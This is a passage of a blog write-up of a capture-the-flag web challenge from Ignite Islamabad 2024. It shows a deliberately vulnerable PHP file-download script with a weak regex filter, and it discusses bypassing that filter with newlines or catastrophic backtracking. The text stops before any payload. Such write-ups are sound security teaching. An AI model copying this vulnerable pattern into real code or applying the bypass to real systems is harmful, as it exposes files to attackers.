<!DOCTYPE html>
<html lang="en">
  <head prefix="og: https://ogp.me/ns#">
    <meta charset="utf-8" />
    <meta name="generator" content="gh:importantimport/urara" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="manifest" crossorigin="use-credentials" href="/manifest.webmanifest" />
    <link rel="alternate" type="application/feed+json" href="/feed.json" />
    <link rel="alternate" type="application/atom+xml" href="/atom.xml" />
    <link rel="sitemap" type="application/xml" href="/sitemap.xml" />
    <meta http-equiv="content-security-policy" content="style-src 'self' 'unsafe-inline' https://giscus.app">
		<link href="../../../_app/immutable/assets/0.4781e3d8.css" rel="stylesheet">
		<link rel="modulepreload" href="../../../_app/immutable/entry/start.05aaa326.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/index.725d15e1.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/singletons.cf3784fb.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/index.f6403797.js">
		<link rel="modulepreload" href="../../../_app/immutable/entry/app.629e3c37.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/preload-helper.41c905a7.js">
		<link rel="modulepreload" href="../../../_app/immutable/nodes/0.c7f340eb.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/posts.7eeb28a4.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/posts.d89605eb.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/icon.fa06396a.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/title.ff9679dd.js">
		<link rel="modulepreload" href="../../../_app/immutable/nodes/15.bd31dd96.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/post_layout.b6bd0bbf.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/post_card.004e8740.js">
		<link rel="modulepreload" href="../../../_app/immutable/chunks/footer.a8ea1951.js"><title>CTF web challenge writeups for Ignite Islamabad 24 regional round | ./khatta.sh | کھاتا</title><!-- HEAD_svelte-1592q3p_START --><link rel="me" href="https://kongwoo.icu/@seviche"><!-- HEAD_svelte-1592q3p_END --><!-- HEAD_svelte-1kxdj3d_START --><link rel="shortcut icon" href="https://blog.shameerkashif.me/favicon.png" sizes="48x48" type="image/png"><link rel="apple-touch-icon" href="https://blog.shameerkashif.me/assets/any@180.png" sizes="180x180" type="image/png"><link rel="icon" href="https://blog.shameerkashif.me/assets/any@192.png" sizes="192x192" type="image/png"><!-- HEAD_svelte-1kxdj3d_END --><!-- HEAD_svelte-1g590ms_START --><meta name="theme-color"><!-- HEAD_svelte-1g590ms_END --><!-- HEAD_svelte-abrfj_START --><meta name="author" content="@hash3liZer"><link rel="canonical" href="https://blog.shameerkashif.me/blog/2024/ctf-ignite-islamabad-regional-24-web-writeups">
    
    <meta name="keywords" content="ignite-24, web, ctf, regional">
    <meta name="description" content="Writeups for all web related challenges from Ignite 2024 regional round of Islamabad"><!-- HTML_TAG_START --><link rel="me" href="https://github.com/hash3liZer" /><!-- HTML_TAG_END --><!-- HTML_TAG_START --><script async src="https://www.googletagmanager.com/gtag/js?id=G-ZZRLH1SYB9"></script><script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag("js", new Date());gtag("config", "G-ZZRLH1SYB9");</script><!-- HTML_TAG_END --><!-- HEAD_svelte-abrfj_END --><!-- HEAD_svelte-4dky5b_START --><meta property="og:site_name" content="./khatta.sh | کھاتا"><meta property="og:locale" content="en"><meta property="og:type" content="article">
    <meta property="og:title" content="CTF web challenge writeups for Ignite Islamabad 24 regional round">
    <meta property="og:description" content="Writeups for all web related challenges from Ignite 2024 regional round of Islamabad">
    <meta property="og:image" content="https://github.com/user-attachments/assets/505ce24b-a239-465b-b2cd-ea90a6f43bbd">
      <meta name="twitter:card" content="summary_large_image">
    <meta property="article:tag" content="ignite-24"><meta property="article:tag" content="web"><meta property="article:tag" content="ctf"><meta property="article:tag" content="regional">
    <meta property="og:url" content="https://blog.shameerkashif.me/blog/2024/ctf-ignite-islamabad-regional-24-web-writeups">
    <meta property="article:author" content="@hash3liZer">
    <meta property="article:published_time" content="2024-11-26T00:00:00.000Z">
    <meta property="article:modified_time" content="2024-11-25T22:21:28.584Z"><!-- HEAD_svelte-4dky5b_END -->
  </head>

  <body itemscope itemtype="https://schema.org/WebPage">
    










<header id="header" class="fixed z-50 w-screen transition-all duration-500 ease-in-out border-b-2 border-transparent max-h-[4.125rem] false"><div class="navbar"><div class="navbar-start">

<div class="dropdown lg:hidden"><label for="navbar-dropdown" tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-menu-alt-1"></span></label>
  <ul id="navbar-dropdown" tabindex="0" class="menu menu-compact dropdown-content bg-base-100 text-base-content shadow-lg rounded-box min-w-max max-w-52 p-2"><li><a href="/resume">About Me</a>
        </li><li><a href="https://shameerkashif.me">Who@mi ➡️</a>
        </li></ul></div>
<div class="swap order-last hidden lg:inline-grid"><button class="swap-on btn btn-ghost text-base font-normal normal-case transition-all duration-200 hidden"></button>
  <ul class="swap-off menu menu-horizontal p-0"><li><a class="!rounded-btn" href="/resume">About Me</a>
        </li><li><a class="!rounded-btn" href="https://shameerkashif.me">Who@mi ➡️</a>
        </li></ul></div>
        <a href="/" class="btn btn-ghost normal-case text-lg">./khatta.sh | کھاتا</a></div>
      <div class="navbar-end"><button aria-label="search" tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-search"></span></button>
        <div id="change-theme" class="dropdown dropdown-end">
          
          <div tabindex="0" class="btn btn-square btn-ghost"><span class="i-heroicons-outline-color-swatch"></span></div>
          
          
          <ul tabindex="0" class="flex flex-nowrap shadow-2xl menu dropdown-content bg-base-100 text-base-content rounded-box w-52 p-2 gap-2 overflow-y-auto max-h-[21.5rem]"><button data-theme="lofi" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Light</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="dracula" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Dracula</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="coffee" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Coffee</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="cupcake" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Cupcake</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="valentine" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Valentine</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="aqua" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Aqua</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="synthwave" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Synthwave</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="night" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Night</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="garden" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Garden</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="lemonade" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Lemonade</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="cmyk" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">CMYK</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="retro" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Retro</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button><button data-theme="black" class="btn btn-ghost w-full hover:bg-primary group rounded-lg flex bg-base-100 p-2 transition-all"><p class="flex-1 text-left text-base-content group-hover:text-primary-content transition-color">Black</p>
                <div class="flex-none m-auto flex gap-1"><div class="bg-primary w-2 h-4 rounded"></div>
                  <div class="bg-secondary w-2 h-4 rounded"></div>
                  <div class="bg-accent w-2 h-4 rounded"></div>
                  <div class="bg-neutral w-2 h-4 rounded"></div></div>
              </button></ul></div></div></div></header>

<button id="totop" aria-label="scroll to top" class="fixed grid group btn btn-circle btn-lg border-none backdrop-blur bottom-6 right-6 z-50 duration-500 ease-in-out btn-ghost bg-base-100/30 md:bg-base-200/30 translate-y-24"><div class="radial-progress text-accent transition-all duration-500 ease-in-out group-hover:text-accent-focus col-start-1 row-start-1" style="--size:4rem; --thickness: 0.25rem; --value:undefined;"></div>
  <div class="border-4 border-base-content/10 group-hover:border-transparent col-start-1 row-start-1 rounded-full w-full h-full p-4 grid duration-500 ease-in-out"><span class="i-heroicons-solid-chevron-up !w-6 !h-6"></span></div></button>

<div class="bg-base-100 md:bg-base-200 min-h-screen pt-16 md:pb-8 lg:pb-16">



<div class="flex flex-col flex-nowrap justify-center xl:flex-row xl:flex-wrap"><div class="flex-1 w-full order-first ease-out transform mx-auto xl:mr-0 xl:ml-0"></div>
  <div class="flex-1 w-full xl:order-last ease-out transform mx-auto xl:ml-0 xl:mr-0"></div>
  <div class="flex-none w-full max-w-screen-md mx-auto xl:mx-0"><article itemscope itemtype="https://schema.org/BlogPosting" itemprop="blogPost" class="h-entry card bg-base-100 rounded-none md:rounded-box md:shadow-lg md:shadow-grey-10 overflow-hidden z-10 md:mb-8 lg:mb-16"><div id="bridgy" class="hidden"><a href="https://brid.gy/publish/mastodon">mastodon</a></div>
  
  
  <div class="card-body gap-0 "><div class="flex flex-col gap-2"><figure class="md:order-last rounded-lg mb-4 flex-col gap-2 -mt-8 md:mt-0'
          }"><img src="https://github.com/user-attachments/assets/505ce24b-a239-465b-b2cd-ea90a6f43bbd" alt="https://github.com/user-attachments/assets/505ce24b-a239-465b-b2cd-ea90a6f43bbd" class="u-featured" loading="lazy" decoding="async"></figure>
      <div class="flex font-semibold gap-1.5"><a rel="author" class="opacity-75 hover:opacity-100 hover:text-primary duration-500 ease-in-out p-author h-card" href="https://blog.shameerkashif.me">@hash3liZer</a>
  <span class="opacity-50">/</span>
  <a href="/blog/2024/ctf-ignite-islamabad-regional-24-web-writeups" class="u-url u-uid swap group/time"><time class="group-hover/time:opacity-0 font-semibold opacity-75 duration-500 ease-in-out mr-auto dt-published" datetime="2024-11-26T00:00:00.000Z" itemprop="datePublished">Tue, Nov 26, 2024</time>
    <time class="opacity-0 group-hover/time:opacity-100 font-semibold text-primary duration-500 ease-in-out mr-auto dt-updated" datetime="2024-11-25T22:21:28.584Z" itemprop="dateModified">Mon, Nov 25, 2024</time></a></div>
      <h1 itemprop="name headline" class="card-title text-2xl mb-8 p-name">CTF web challenge writeups for Ignite Islamabad 24 regional round</h1>
      <p itemprop="description" class="p-summary mb-auto hidden">Writeups for all web related challenges from Ignite 2024 regional round of Islamabad</p></div>
    <main itemprop="articleBody" class="urara-prose prose e-content"><h2 id="readme--easy"><a href="#readme--easy">readme | Easy</a></h2>
<blockquote><p>The flag was in <code>.ht_flag.txt</code> file. </p></blockquote>
<p>This challenge was basically the upgraded version of the easy challenge from Karachi. The challenge was exactly similar except for one minor thing. The source code of the challenge is given as:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;?</span><span style="color: #EEFFFF">php</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">normalize</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">path</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">parts </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">explode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">path</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">safeParts </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">[];</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">foreach</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">parts </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">.</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">||</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">continue</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">..</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #82AAFF">array_pop</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">safeParts</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">else</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">safeParts</span><span style="color: #89DDFF">[]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">    </span><span style="color: #546E7A">// Rebuild the path</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">implode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">safeParts</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">isset</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">GET</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">source</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]))</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">showsource</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">__FILE</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">exit</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">isset</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">_GET</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]))</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">_REQUEST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">];</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(!</span><span style="color: #82AAFF">preg_match</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'/^</span><span style="color: #C3E88D">.(php|flag).</span><span style="color: #89DDFF">/'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">file</span><span style="color: #89DDFF">))</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">real_file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">normalize</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">file</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">readfile</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">real_file</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">else</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">die</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">nope</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">else</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">?&gt;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">h3</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #EEFFFF">a target</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">_blank</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> href</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/?source</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">Source</span><span style="color: #89DDFF">?&lt;/</span><span style="color: #EEFFFF">a</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #EEFFFF">h3</span><span style="color: #89DDFF">&gt;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">form action</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> method</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">get</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> enctype</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">multipart/form-data</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">        Select a file to download</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">input type</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">text</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> name</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">input type</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">submit</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> value</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Download!</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> name</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">submit</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;/</span><span style="color: #EEFFFF">form</span><span style="color: #89DDFF">&gt;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;?</span><span style="color: #EEFFFF">php</span></div><div class='line'><span style="color: #EEFFFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">?&gt;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>While analyzing the code and comparing it with the challenge from Karachi, i came across the difference in both files which was the regex in the filter:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">if (!preg_match('/^.(php|flag)./', $file)) &#123;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Whilst, in <strong>Karachi</strong> challenge in regex, we had the <code>multiline</code> flag like this: <code>/^.(php|flag)./m</code>. This doesn’t mean much except for the fact that we can use a newline character <code>\n</code> to bypass this regex. </p>
<p>The actual solution for the Karachi challenge was that we can do a <code>Catastrophic Backtracking Attack</code> to provide a large string to PHP which would bypass the regex as well. I tried that for a while with no success. Then analyzing the code, the following part seems to be vulnerable:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">foreach</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">parts </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">.</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">||</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">continue</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">..</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">array_pop</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">safeParts</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">else</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">safeParts</span><span style="color: #89DDFF">[]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
